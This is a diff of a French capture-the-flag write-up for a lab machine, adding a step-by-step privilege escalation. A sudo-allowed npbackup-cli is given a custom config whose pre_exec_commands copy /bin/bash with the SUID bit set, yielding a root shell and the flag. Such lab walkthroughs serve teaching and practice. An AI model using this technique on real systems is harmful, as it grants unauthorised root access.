@@ -704,7 +704,7 @@ Le principe de ce PoC consiste à utiliser les mécanismes d’introspection de 
 
 Tu peux alors copier-coller le payload publié par **Marven11** dans l’interface Web. 
 
- 
+
 Pour vérifier que le PoC fonctionne correctement, on peut commencer par exécuter une commande simple comme **`id`** :
 
 ```javascript
@@ -982,9 +982,220 @@ La prochaine étape consiste maintenant à **chercher un moyen d’élever les p
 
 Tu commences toujours par vérifier les droits <code>sudo</code> :
 
+```bash
+marco@codeparttwo:~$ sudo -l
+Matching Defaults entries for marco on codeparttwo:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User marco may run the following commands on codeparttwo:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
+```
+
+La sortie indique que l’utilisateur **marco** peut exécuter :
+
+```bash
+(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
+```
+
+**Le programme `npbackup-cli` peut donc être exécuté en root, ce qui en fait une piste prioritaire pour l’escalade de privilèges.**
+
+### Identification des éléments liés à npbackup
+
+En listant le contenu du répertoire personnel, on observe également la présence d’un fichier de configuration :
+
+```bash
+ls -l
+-rw-rw-r-- 1 root root 2893 Jun 18 2025 npbackup.conf
+```
+
+On dispose donc de deux informations importantes :
+
+- un programme **`npbackup-cli`** exécutable en **root**
+- un fichier de configuration **`npbackup.conf`**
+
+**L’analyse va se concentrer sur ces deux éléments en appliquant la méthode décrite dans la recette {{< recette "analyse-mots-cles" >}} :.**
+
+### Analyse du `--help` de `npbackup-cli`
+
+Parmi toutes les commandes testées dans la recette, celle portant sur les notions de **Fichiers et chemins** est particulièrement intéressante.
+
+```
+npbackup-cli --help | grep -Ein 'config|conf|file|path|dir|directory|folder|source|destination|target|output|tmp|temp'
+```
+
+Plusieurs options liées à la configuration ressortent :
+
+```
+-c CONFIG_FILE, --config-file CONFIG_FILE
+--check-config-file
+```
+
+- `--config-file` permet de charger une **configuration personnalisée**
+- `--check-config-file` permet de **valider une configuration**
+
+**Le programme repose sur un fichier de configuration et te permet d’en fournir un personnalisé. Tu peux donc contrôler son comportement, ce qui constitue une piste intéressante pour l’escalade de privilèges.**
+
+### Analyse du fichier `npbackup.conf`
+
+Parmi toutes les commandes testées, celle portant sur les notions de **backup et d’automatisation** permet de faire ressortir les paramètres les plus intéressants :
+
+```
+grep -Ein 'backup|restore|snapshot|archive|tar|rsync|hook|pre|post|cron|task|job|exec' npbackup.conf
+```
+
+La sortie met notamment en évidence :
+
+```
+pre_exec_commands: []
+post_exec_commands: []
+```
+
+Ces paramètres permettent d’exécuter des commandes avant ou après la sauvegarde.
+
+**Comme tu peux fournir ton propre fichier de configuration et que `npbackup-cli` s’exécute avec les privilèges root, tu peux contrôler ces commandes, ce qui ouvre la voie à l’escalade de privilèges.**
+
+### Mise en place de l’exploitation
+
+On vérifie d'abord que le fichier de configuration existant est valide :
+
+```bash
+sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf --check-config-file
+```
+
+La sortie confirme que la configuration est correctement chargée et valide :
+
+```text
+Loaded config ... in /home/marco/npbackup.conf
+Config file seems valid
+state is: success
+```
+
+On peut donc se baser sur ce fichier fonctionnel pour construire notre configuration, en modifiant uniquement les paramètres nécessaires à l’exploitation.
+
+### Choix du répertoire de travail
+
+Tu remarqueras assez rapidement que le répertoire `/home/marco` est régulièrement nettoyé et reconstitué.
+Les répertoires de travail classiques comme `/tmp` et `/dev/shm` sont également soumis à des mécanismes de nettoyage.
+
+Si tu veux le vérifier, crée un fichier de test dans ces répertoires :
+
+```
+echo test > /home/marco/test.txt
+echo test > /tmp/test.txt
+echo test > /dev/shm/test.txt
+```
+
+Puis observe leur contenu en temps réel avec la commande suivante :
+
+```bash
+start=$(date +%s); while true; do clear; echo "Temps: $(( $(date +%s)-start ))s"; for f in /home/marco/test.txt /tmp/test.txt /dev/shm/test.txt; do echo "--- $f ---"; cat "$f" 2>/dev/null || echo "[disparu]"; done; sleep 2; done
+```
+
+Après quelques minutes (généralement moins de 4 minutes pour `/home/marco`, mais pouvant aller jusqu’à 15 minutes pour `/tmp` et `/dev/shm`), les fichiers disparaissent automatiquement.
+
+```bash
+Temps écoulé : 827s
+----- /home/marco/test.txt -----
+[disparu]
+----- /tmp/test.txt -----
+[disparu]
+----- /dev/shm/test.txt -----
+[disparu]
+```
+
+Cela confirme la présence d’un mécanisme de nettoyage automatique sur ces répertoires.
+
+Il est nécessaire de trouver un répertoire accessible en écriture par l’utilisateur **marco** et non soumis à un mécanisme de nettoyage.
+
+On peut rechercher les répertoires accessibles en écriture avec la commande suivante :
+
+```bash
+find / -type d -writable 2>/dev/null
+```
+
+Parmi les résultats, le répertoire `/var/tmp` attire l’attention.
+
+Contrairement à `/home/marco`, `/tmp` et `/dev/shm`, il n’est pas soumis au mécanisme de nettoyage observé précédemment.
+ Si tu veux, tu peux également le vérifier en y créant un fichier et en observant qu’il n’est pas supprimé.
+
+**On utilise donc `/var/tmp`comme répertoire de travail pour la suite de l’exploitation.**
+
+### Choix de la stratégie
+
+La première étape consiste à copier le fichier de configuration dans notre répertoire de travail :
+
+```bash
+cp /home/marco/npbackup.conf /var/tmp/root.conf
+```
+
+La stratégie consiste ensuite à exploiter le paramètre `pre_exec_commands` de notre copie du fichier de configuration.
+
+Ce paramètre permet d’exécuter des commandes avant le lancement du backup.
+ Comme `npbackup-cli` est exécuté avec les privilèges root, ces commandes seront elles aussi exécutées en root.
+
+L’objectif est donc d’y injecter les commandes nécessaires pour obtenir un accès privilégié.
+
+Les commandes utilisées sont :
+
+- copie du binaire `/bin/bash` dans /var/tmp
+- application du bit SUID avec `chmod +s`
+
+Cela permet d’obtenir un binaire exécutable avec les privilèges root.
+
+> **Note :** Il aurait également été possible d’utiliser un reverse shell, mais la création d’un binaire SUID est plus simple et plus directe dans ce contexte.
 
 
----
+
+### Exécution de l’exploit
+
+On commence par modifier notre fichier de configuration `/var/tmp/root.conf` en ajoutant les commandes dans `pre_exec_commands` :
+
+```
+pre_exec_commands:
+  - cp /bin/bash /var/tmp/rootbash
+  - chmod +s /var/tmp/rootbash
+```
+
+> note : il faut indenter avec des espaces sinon le fichier ne sera pas valide
+
+Une fois le fichier modifié, on vérifie qu’il est valide :
+
+```
+sudo /usr/local/bin/npbackup-cli -c /var/tmp/root.conf --check-config-file
+```
+
+La sortie confirme que la configuration est correctement chargée.
+
+On peut alors lancer le backup :
+
+```
+sudo /usr/local/bin/npbackup-cli -c /var/tmp/root.conf --backup
+```
+
+Les commandes définies dans `pre_exec_commands` sont exécutées avec les privilèges root, ce qui permet de créer le binaire SUID.
+
+------
+
+### Obtention du shell root
+
+Il ne reste plus qu’à exécuter le binaire :
+
+```
+/var/tmp/rootbash -p
+```
+
+Puis vérifier les privilèges :
+
+```
+id
+```
+
+On obtient alors un shell en tant que **root**, ce qui permet d’accéder au flag final :
+
+```
+cat /root/root.txt
+```
 
 ## Conclusion
 
